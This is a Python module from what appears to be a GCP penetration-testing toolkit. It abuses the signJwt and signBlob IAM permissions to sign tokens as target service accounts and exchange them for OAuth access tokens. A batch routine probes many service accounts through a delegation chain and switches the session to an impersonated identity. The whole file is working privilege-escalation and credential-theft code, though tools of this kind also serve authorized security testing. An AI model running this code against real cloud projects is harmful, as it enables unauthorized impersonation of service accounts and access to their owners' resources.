"""
GCP Service Account JWT Signing Module.

Exploits the iam.serviceAccounts.signJwt permission to:
- Sign arbitrary JWTs as the service account
- Generate access tokens via self-signed JWTs
- Create OIDC tokens for authentication to other services

This is useful when you have signJwt but not getAccessToken.
You can create a signed JWT and exchange it for an access token.

References:
- https://cloud.google.com/iam/docs/reference/credentials/rest/v1/projects.serviceAccounts/signJwt
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
"""

import base64
import json
import time
from typing import Dict, Any, Optional, List, TYPE_CHECKING

import requests
from google.auth.transport.requests import Request  # PERF-008: Move import to module level
from rich.console import Console
from rich.prompt import Prompt

from ...utils import parse_error  # DUP-005: Centralized error parsing

if TYPE_CHECKING:
    from ...gcp_session import GCPSessionManager

console = Console()

# IAM Credentials API base URL
IAM_CREDENTIALS_API = "https://iamcredentials.googleapis.com/v1"

# OAuth2 token endpoint
OAUTH_TOKEN_URL = "https://oauth2.googleapis.com/token"


def sign_jwt(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
    payload: Optional[Dict[str, Any]] = None,
    delegates: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """
    Sign a JWT using a service account's private key.

    Requires: iam.serviceAccounts.signJwt on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email
        payload: JWT payload (claims). If None, generates a default access token claim
        delegates: Delegation chain for implicit delegation

    Returns:
        Dictionary with signed JWT, or None on failure
    """
    console.print("\n[bold blue]🔐 Sign JWT as Service Account[/bold blue]")
    console.print("[dim]Exploiting: iam.serviceAccounts.signJwt[/dim]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Target service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    console.print(f"[dim]Target: {service_account_email}[/dim]")
    if delegates:
        console.print(f"[dim]Delegates: {' → '.join(delegates)}[/dim]")

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    # Generate default payload if not provided
    if payload is None:
        now = int(time.time())
        payload = {
            "iss": service_account_email,
            "sub": service_account_email,
            "aud": OAUTH_TOKEN_URL,
            "iat": now,
            "exp": now + 3600,  # 1 hour
            "scope": "https://www.googleapis.com/auth/cloud-platform",
        }
        console.print("[dim]Using default OAuth2 token claim payload[/dim]")

    # Build the API URL
    url = f"{IAM_CREDENTIALS_API}/projects/-/serviceAccounts/{service_account_email}:signJwt"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    body: Dict[str, Any] = {
        "payload": json.dumps(payload),
    }

    # Add delegates if provided
    if delegates:
        body["delegates"] = [f"projects/-/serviceAccounts/{sa}" for sa in delegates]

    console.print("\n[cyan]Signing JWT...[/cyan]")

    try:
        response = requests.post(url, headers=headers, json=body, timeout=30)

        if response.status_code == 200:
            result = response.json()
            signed_jwt = result.get("signedJwt", "")
            key_id = result.get("keyId", "unknown")

            console.print(f"\n[bold green]✅ JWT signed successfully![/bold green]")
            console.print(f"  [green]Key ID used:[/green] {key_id}")
            console.print(f"  [green]JWT length:[/green] {len(signed_jwt)} chars")

            # Decode and display JWT parts (for debugging)
            try:
                jwt_parts = signed_jwt.split(".")
                if len(jwt_parts) == 3:
                    header_b64 = jwt_parts[0]
                    payload_b64 = jwt_parts[1]

                    # Add padding if needed
                    header_b64 += "=" * (4 - len(header_b64) % 4)
                    payload_b64 += "=" * (4 - len(payload_b64) % 4)

                    header = json.loads(base64.urlsafe_b64decode(header_b64))
                    payload_decoded = json.loads(base64.urlsafe_b64decode(payload_b64))

                    console.print("\n[bold]JWT Header:[/bold]")
                    console.print(f"[dim]{json.dumps(header, indent=2)}[/dim]")
                    console.print("\n[bold]JWT Payload:[/bold]")
                    console.print(f"[dim]{json.dumps(payload_decoded, indent=2)}[/dim]")
            except Exception:
                pass

            return {
                "signed_jwt": signed_jwt,
                "key_id": key_id,
                "service_account": service_account_email,
                "payload": payload,
            }

        elif response.status_code == 403:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]Permission denied: {error_msg}[/red]")
            console.print("[dim]You need iam.serviceAccounts.signJwt on this SA.[/dim]")
            return None

        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def sign_jwt_for_access_token(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
    delegates: Optional[List[str]] = None,
    scopes: Optional[List[str]] = None,
    lifetime: int = 3600,
) -> Optional[str]:
    """
    Sign a JWT and exchange it for an access token.

    This is the full exploitation chain:
    1. Sign a JWT with OAuth2 claims
    2. Send it to Google's token endpoint
    3. Get back an access token

    Requires: iam.serviceAccounts.signJwt on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email
        delegates: Delegation chain for implicit delegation
        scopes: OAuth scopes (default: cloud-platform)
        lifetime: Token lifetime in seconds

    Returns:
        Access token string, or None on failure
    """
    console.print("\n[bold blue]🔐 Sign JWT → Exchange for Access Token[/bold blue]")
    console.print("[dim]Exploiting: iam.serviceAccounts.signJwt[/dim]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Target service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    if scopes is None:
        scopes = ["https://www.googleapis.com/auth/cloud-platform"]

    # Step 1: Create and sign the JWT
    now = int(time.time())
    payload = {
        "iss": service_account_email,
        "sub": service_account_email,
        "aud": OAUTH_TOKEN_URL,
        "iat": now,
        "exp": now + lifetime,
        "scope": " ".join(scopes),
    }

    console.print("[cyan]Step 1: Signing JWT...[/cyan]")
    result = sign_jwt(session_mgr, service_account_email, payload, delegates)

    # Check for both None and missing/malformed result
    if not result or "signed_jwt" not in result:
        console.print("[red]Failed to sign JWT - no signed_jwt in response[/red]")
        return None

    signed_jwt = result["signed_jwt"]
    if not signed_jwt:
        console.print("[red]JWT signing returned empty token[/red]")
        return None

    # Step 2: Exchange JWT for access token
    console.print("\n[cyan]Step 2: Exchanging JWT for access token...[/cyan]")

    token_data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion": signed_jwt,
    }

    try:
        response = requests.post(OAUTH_TOKEN_URL, data=token_data, timeout=30)

        if response.status_code == 200:
            token_response = response.json()
            access_token = token_response.get("access_token", "")
            token_type = token_response.get("token_type", "Bearer")
            expires_in = token_response.get("expires_in", 0)

            console.print(f"\n[bold green]✅ Access token obtained![/bold green]")
            console.print(f"  [green]Token type:[/green] {token_type}")
            console.print(f"  [green]Expires in:[/green] {expires_in} seconds")
            console.print(f"  [green]Token length:[/green] {len(access_token)} chars")

            # Ask if user wants to switch to this identity
            switch = Prompt.ask(
                "\n[cyan]Switch to this identity? (creates new session)[/cyan]",
                choices=["y", "n"],
                default="y"
            )

            if switch.lower() == "y":
                # Create new session with impersonated credentials
                original_session = session_mgr.current_session
                new_session_name = f"jwt-{service_account_email.split('@')[0][:20]}"
                session_mgr.create_or_load_session(new_session_name)

                # Extract project from SA email
                project_id = service_account_email.split("@")[1].replace(".iam.gserviceaccount.com", "")

                session_mgr.set_access_token(access_token, project_id, skip_tokeninfo=True)
                session_mgr.current_session_data["impersonated_from"] = original_session
                session_mgr.current_session_data["impersonated_sa"] = service_account_email
                session_mgr.current_session_data["service_account_email"] = service_account_email
                session_mgr.current_session_data["via_method"] = "signJwt"
                if delegates:
                    session_mgr.current_session_data["delegation_chain"] = delegates
                session_mgr.save_current_session()

                console.print(f"\n[green]Switched to new session: {new_session_name}[/green]")
                console.print(f"[dim]Identity: {service_account_email}[/dim]")
            else:
                console.print("\n[bold]Access Token:[/bold]")
                console.print(f"[dim]{access_token[:50]}...{access_token[-20:]}[/dim]")

            return access_token

        else:
            error_msg = response.text
            try:
                error_json = response.json()
                error_msg = error_json.get("error_description", error_json.get("error", response.text))
            except Exception:
                pass
            console.print(f"[red]Token exchange failed: {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def sign_blob(
    session_mgr: "GCPSessionManager",
    service_account_email: Optional[str] = None,
    blob: Optional[bytes] = None,
    delegates: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """
    Sign arbitrary data using a service account's private key.

    Requires: iam.serviceAccounts.signBlob on the target SA.

    Args:
        session_mgr: GCP session manager with valid credentials
        service_account_email: Target service account email
        blob: Data to sign (will be base64 encoded)
        delegates: Delegation chain for implicit delegation

    Returns:
        Dictionary with signed data, or None on failure
    """
    console.print("\n[bold blue]🔐 Sign Blob as Service Account[/bold blue]")
    console.print("[dim]Exploiting: iam.serviceAccounts.signBlob[/dim]\n")

    # Get target SA
    if not service_account_email:
        service_account_email = Prompt.ask(
            "[cyan]Target service account email[/cyan]",
            default=""
        )
        if not service_account_email:
            console.print("[red]Service account email is required.[/red]")
            return None

    # Get blob data
    if blob is None:
        blob_input = Prompt.ask(
            "[cyan]Data to sign (text)[/cyan]",
            default="test"
        )
        blob = blob_input.encode("utf-8")

    console.print(f"[dim]Target: {service_account_email}[/dim]")
    console.print(f"[dim]Blob size: {len(blob)} bytes[/dim]")

    # Get credentials token
    token = session_mgr.get_access_token()  # DUP-004: Use centralized method
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    # Build the API URL
    url = f"{IAM_CREDENTIALS_API}/projects/-/serviceAccounts/{service_account_email}:signBlob"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    body: Dict[str, Any] = {
        "payload": base64.b64encode(blob).decode("utf-8"),
    }

    # Add delegates if provided
    if delegates:
        body["delegates"] = [f"projects/-/serviceAccounts/{sa}" for sa in delegates]

    console.print("\n[cyan]Signing blob...[/cyan]")

    try:
        response = requests.post(url, headers=headers, json=body, timeout=30)

        if response.status_code == 200:
            result = response.json()
            signed_blob = result.get("signedBlob", "")
            key_id = result.get("keyId", "unknown")

            console.print(f"\n[bold green]✅ Blob signed successfully![/bold green]")
            console.print(f"  [green]Key ID used:[/green] {key_id}")
            console.print(f"  [green]Signature (base64):[/green]")
            console.print(f"  [dim]{signed_blob[:80]}...[/dim]")

            return {
                "signed_blob": signed_blob,
                "key_id": key_id,
                "service_account": service_account_email,
            }

        elif response.status_code == 403:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]Permission denied: {error_msg}[/red]")
            console.print("[dim]You need iam.serviceAccounts.signBlob on this SA.[/dim]")
            return None

        else:
            error_msg = parse_error(response)  # DUP-005: Use centralized function
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {e}[/red]")
        return None


def sign_jwt_batch(
    session_mgr: "GCPSessionManager",
    target_service_accounts: Optional[List[str]] = None,
    delegate: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Batch test signJwt on multiple service accounts using a delegation chain.

    This function mimics the behavior of iterating through multiple SAs
    to find which ones can be impersonated via a delegate. After successfully
    obtaining access tokens, prompts user to switch to one of the impersonated identities.

    Args:
        session_mgr: GCP session manager with valid credentials
        target_service_accounts: List of SA emails to test, or None to load from enumeration
        delegate: Delegate SA email for delegation chain (the SA you have signJwt on)

    Returns:
        Dictionary with results: {"successful": [...], "failed": [...]}
    """
    console.print("\n[bold blue]🔐 Batch Sign JWT via Delegation Chain[/bold blue]")
    console.print("[dim]Testing signJwt on multiple service accounts via delegate[/dim]\n")

    # Get delegate
    if not delegate:
        delegate = Prompt.ask(
            "[cyan]Delegate service account email (the SA you have signJwt on)[/cyan]",
            default=""
        )
        if not delegate:
            console.print("[red]Delegate service account is required.[/red]")
            return {"successful": [], "failed": []}

    # Get target SAs
    if not target_service_accounts:
        # Try to load from enumeration cache
        session_name = session_mgr.current_session
        enumerated_sas = (
            session_mgr.enumerated_data.get(session_name, {})
            .get("service_accounts", [])
            if session_name in session_mgr.enumerated_data
            else []
        )

        if enumerated_sas:
            console.print(f"[green]Found {len(enumerated_sas)} service accounts in enumeration cache.[/green]")
            use_cache = Prompt.ask(
                "[cyan]Use enumerated service accounts?[/cyan]",
                choices=["y", "n"],
                default="y"
            )
            if use_cache.lower() == "y":
                target_service_accounts = [sa.get("email", sa.get("name", "")) for sa in enumerated_sas]
                target_service_accounts = [sa for sa in target_service_accounts if sa]

        if not target_service_accounts:
            console.print("[yellow]No enumerated service accounts found.[/yellow]")
            console.print("[dim]Enter service account emails (one per line, empty line to finish):[/dim]")
            target_service_accounts = []
            while True:
                sa = Prompt.ask("[cyan]Service account email[/cyan]", default="")
                if not sa:
                    break
                target_service_accounts.append(sa)

    if not target_service_accounts:
        console.print("[red]No target service accounts provided.[/red]")
        return {"successful": [], "failed": []}

    console.print(f"\n[bold]Configuration:[/bold]")
    console.print(f"  [cyan]Delegate:[/cyan] {delegate}")
    console.print(f"  [cyan]Targets:[/cyan] {len(target_service_accounts)} service accounts\n")

    # Get credentials token once
    token = session_mgr.get_access_token()
    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return {"successful": [], "failed": []}

    results = {
        "successful": [],
        "failed": [],
        "delegate": delegate,
    }

    # Test each SA
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("•"),
        TextColumn("{task.completed}/{task.total} SAs"),
        TextColumn("•"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task(
            "[cyan]Testing signJwt via delegate...",
            total=len(target_service_accounts)
        )

        for target_sa in target_service_accounts:
            progress.update(task, description=f"[cyan]Testing {target_sa[:30]}...")

            # Create JWT payload
            now = int(time.time())
            payload = {
                "iss": target_sa,
                "scope": "https://www.googleapis.com/auth/cloud-platform",
                "aud": OAUTH_TOKEN_URL,
                "iat": now,
                "exp": now + 3600,
            }

            # Build request
            url = f"{IAM_CREDENTIALS_API}/projects/-/serviceAccounts/{target_sa}:signJwt"
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }

            body = {
                "delegates": [f"projects/-/serviceAccounts/{delegate}"],
                "payload": json.dumps(payload),
            }

            try:
                response = requests.post(url, headers=headers, json=body, timeout=30)

                if response.status_code == 200:
                    result = response.json()
                    signed_jwt = result.get("signedJwt", "")
                    key_id = result.get("keyId", "")

                    results["successful"].append({
                        "service_account": target_sa,
                        "key_id": key_id,
                        "signed_jwt": signed_jwt,
                        "payload": payload,
                    })

                else:
                    error_data = response.json() if response.headers.get("content-type", "").startswith("application/json") else {}
                    error_msg = error_data.get("error", {}).get("message", response.text[:100])
                    results["failed"].append({
                        "service_account": target_sa,
                        "error": error_msg,
                        "status_code": response.status_code,
                    })

            except Exception as e:
                results["failed"].append({
                    "service_account": target_sa,
                    "error": str(e)[:100],
                    "status_code": None,
                })

            progress.advance(task)

    # Display results
    console.print()
    console.print(f"[bold green]✅ Successful:[/bold green] {len(results['successful'])} service account(s)")
    console.print(f"[bold red]✗ Failed:[/bold red] {len(results['failed'])} service account(s)")
    console.print()

    if results["successful"]:
        from rich.table import Table

        table = Table(title="Service Accounts with signJwt Access (via delegate)")
        table.add_column("Service Account", style="cyan", overflow="fold", no_wrap=False)
        table.add_column("Key ID", style="dim")
        table.add_column("JWT Length", style="green", justify="right")

        for sa_result in results["successful"]:
            table.add_row(
                sa_result["service_account"],
                sa_result["key_id"][:20] + "...",
                str(len(sa_result["signed_jwt"])),
            )

        console.print(table)

        # Ask if user wants to exchange JWTs for access tokens
        console.print()
        if Prompt.ask(
            "[cyan]Exchange signed JWTs for access tokens?[/cyan]",
            choices=["y", "n"],
            default="y"
        ).lower() == "y":
            console.print("\n[bold blue]🔄 Exchanging JWTs for Access Tokens...[/bold blue]\n")

            for sa_result in results["successful"]:
                target_sa = sa_result["service_account"]
                signed_jwt = sa_result["signed_jwt"]

                console.print(f"[cyan]→ {target_sa}[/cyan]")

                # Exchange JWT for access token
                token_data = {
                    "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                    "assertion": signed_jwt,
                }

                try:
                    response = requests.post(OAUTH_TOKEN_URL, data=token_data, timeout=30)

                    if response.status_code == 200:
                        token_response = response.json()
                        access_token = token_response.get("access_token", "")
                        expires_in = token_response.get("expires_in", 0)

                        console.print(f"  [green]✓ Access token obtained (expires in {expires_in}s)[/green]")

                        # Store access token in result
                        sa_result["access_token"] = access_token
                        sa_result["expires_in"] = expires_in

                    else:
                        error_data = response.json() if response.headers.get("content-type", "").startswith("application/json") else {}
                        error_msg = error_data.get("error_description", error_data.get("error", response.text[:100]))
                        console.print(f"  [red]✗ Token exchange failed: {error_msg}[/red]")
                        sa_result["token_exchange_error"] = error_msg

                except Exception as e:
                    console.print(f"  [red]✗ Error: {str(e)[:80]}[/red]")
                    sa_result["token_exchange_error"] = str(e)[:100]

            console.print()

            # Ask if user wants to switch to one of the impersonated identities
            successful_with_tokens = [s for s in results["successful"] if "access_token" in s]
            if successful_with_tokens:
                console.print()
                switch = Prompt.ask(
                    "[cyan]Switch to one of these identities? (creates new session)[/cyan]",
                    choices=["y", "n"],
                    default="y"
                )

                if switch.lower() == "y":
                    # Show list of available SAs
                    console.print("\n[bold]Available service accounts:[/bold]")
                    for idx, sa_result in enumerate(successful_with_tokens, 1):
                        console.print(f"  [{idx}] {sa_result['service_account']}")

                    # Ask which one to switch to
                    choice = Prompt.ask(
                        "[cyan]Select service account number[/cyan]",
                        choices=[str(i) for i in range(1, len(successful_with_tokens) + 1)],
                        default="1"
                    )

                    selected_sa = successful_with_tokens[int(choice) - 1]
                    target_sa = selected_sa["service_account"]
                    access_token = selected_sa["access_token"]

                    # Create new session with impersonated credentials
                    original_session = session_mgr.current_session
                    new_session_name = f"jwt-{target_sa.split('@')[0][:20]}"
                    session_mgr.create_or_load_session(new_session_name)

                    # Extract project from SA email
                    project_id = target_sa.split("@")[1].replace(".iam.gserviceaccount.com", "")

                    session_mgr.set_access_token(access_token, project_id, skip_tokeninfo=True)
                    session_mgr.current_session_data["impersonated_from"] = original_session
                    session_mgr.current_session_data["impersonated_sa"] = target_sa
                    session_mgr.current_session_data["service_account_email"] = target_sa
                    session_mgr.current_session_data["via_method"] = "signJwt+delegate"
                    session_mgr.current_session_data["delegation_chain"] = [delegate]
                    session_mgr.save_current_session()

                    console.print(f"\n[green]✓ Switched to new session: {new_session_name}[/green]")
                    console.print(f"[dim]Identity: {target_sa}[/dim]")
                    console.print(f"[dim]Original session: {original_session}[/dim]")

    # Save results to session
    session_mgr.save_enumeration_data("sign_jwt_batch_results", results)
    console.print("\n[green]Results saved under key 'sign_jwt_batch_results' in session data.[/green]")

    return results
